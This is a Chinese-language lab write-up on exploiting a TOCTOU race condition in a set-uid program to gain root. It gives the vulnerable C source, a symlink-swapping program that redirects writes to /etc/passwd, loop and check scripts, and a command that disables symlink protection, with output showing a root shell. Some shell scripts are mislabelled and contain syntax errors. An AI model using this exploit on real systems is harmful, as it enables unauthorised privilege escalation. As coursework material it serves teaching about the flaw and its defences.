## Race Condition

### 概述竞争条件
char* fn = "/tmp/xyz"  
检查access(fn,W_OK) 使用open(fn,"a+")  
在检查和使用的时候fn所指向的文件不是一个文件  
检查的时候判断的是用户真实ID  
使用的时候判断的是用户的有效ID  

本实验的目的是利用这个漏洞获得root权限  
我们需要创造竞争条件，来完成这个实验  
竞争条件需求:
1. 需要这个有漏洞的程序反复运行
2. 需要一个反复更改/tmp/xyz文件的链接
3. 需要一个反复检查结果是否成功的脚本

### 初始化攻击环境
0. 实验环境:ubuntu12
1. 关闭保护机制
$ sudo sysctl -w kernel.yama.protected_sticky_symlinks=0
2. 创建普通文件./XYZ

### 漏洞程序分析

漏洞程序源码:vulp.c
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
int main()
{
    char * fn = "/tmp/xyz";
    char buffer[] = "0000";
    FILE *fp;
    if(!access(fn, W_OK))
	{
        fp = fopen(fn, "r+");
        fseek(fp,-28,SEEK_END);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    }
    else printf("No permission \n");
}
```
运行脚本:attack.sh
```python
#!/bin/sh
$a = 0
while ["$a" == "$a"]
do
    ./vulp
done
```
检查运行结果是否修改了/etc/passwd文件:check.sh
```python
#!/bin/sh
old=`ls -l /etc/passwd`
new=`ls -l /etc/passwd`
while [ "$old" = "$new" ]
do
    new=`ls -l /etc/passwd`
done
echo "STOP... The passwd file has been changed"

```
修改/tmp/xyz软链接源文件:scrip.c
```c
#include <unistd.h>
int main()
{
    while(1)
    {
        unlink("/tmp/xyz");
        symlink("/home/seed/Seed/race-condition/XYZ","/tmp/xyz");
        usleep(10000);
        unlink("/tmp/xyz");
        symlink("/etc/passwd","/tmp/xyz");
        usleep(10000);
    }
    return 0;
}

```

### 漏洞利用获得root权限

1. 普通用户编译scrip.c，运行循环执行脚本attack.sh
2. root用户编译vulp.c，设置set-uid位，普通用户运行
3. 运行检查结果脚本check.sh

攻击结果:

```
gu:x:0000:1004::/home/gu:/bin/sh
[03/26/2018 23:17] seed@ubuntu:~/Seed/race-condition$ su gu
Password: 
# 
# whoami
root
#
```

### 保护措施

1. 保证检查和使用的文件是同一个文件
2. 及时回收set-uid的特权
3. 打开ubuntu12系统保护
$ sudo sysctl -w kernel.yama.protected_sticky_symlinks=1

